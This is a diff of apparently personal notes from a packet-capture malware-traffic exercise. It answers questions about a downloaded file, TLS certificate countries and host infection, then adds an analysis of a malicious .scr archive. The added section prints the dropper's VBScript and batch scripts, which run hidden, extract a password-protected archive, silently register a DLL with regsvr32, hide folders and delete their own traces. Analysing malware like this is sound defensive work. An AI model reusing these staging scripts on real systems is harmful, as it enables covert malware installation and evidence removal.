@@ -14,6 +14,7 @@ app.php
 
 5. what file is saved?
 Ref_Sept24-2020.zip (via the app.php code, saveas line 68
+(unzipped, file is Ref_Sept24-2020.scr)
 
 6. What countries, in alphabetial order separated by commas, had bad TLS certificate registrations
 filter: x509if.RDNSequence_item == 1
@@ -24,3 +25,54 @@ Israel
 South Sudan
 
 7. Is the host infected? 
+yes
+
+
+
+
+---
+Ref_Sept24-2020.zip > Ref_Sept24-2020.scr (RAR Archive)
+Contains:
+* PLS.exe
+* selector.vbs
+    Set WshShell = CreateObject("WScript.Shell")
+    WshShell.Run "dsep.bat", 0, false
+* dsep.bat
+    rename SLP.txt hl.rar
+    "PLS.exe" e -pVersion hl.rar
+    timeout 5
+
+    start fatless.vbs
+    timeout 4
+    del /f /q "hl.rar"
+    del /f /q "dsep.bat"
+    del /f /q "C:\Users\mycomp\Desktop\inst.exe"
+    @exit
+* SLP.txt (encrypted RAR file extracted with command form dsep.bat, contains)
+    * fatless.vbs
+        Set WshShell = CreateObject("WScript.Shell")
+        WshShell.Run "C:\XIU\configurate\lll.bat", 0, false
+    * lll.bat
+        @echo off
+        attrib +s +h "C:\XIU"
+        timeout 2
+        set lkpzaffqx=C:\XIU\configurate
+        set cdeefyxbe=CONFIG.dll
+        cd C:\XIU\configurate
+        regsvr32 -s CONFIG.dll
+        taskkill /f /im PLS.exe
+        taskkill /f /im PLS.exe
+        attrib -s -h "C:\XIU\configurate\CONFIG.dll"
+
+        timeout 4
+        del "C:\XIU\configurate\selector.vbs"
+        del "C:\XIU\configurate\PLS.exe"
+        del "C:\XIU\configurate\fatless.vbs"
+        del "C:\XIU\configurate\lll.bat"
+        del "C:\XIU\configurate\*.*"
+        rd "C:\XIU\configurate\"
+        @exit
+    * CONFIG.dll
+
+
+    
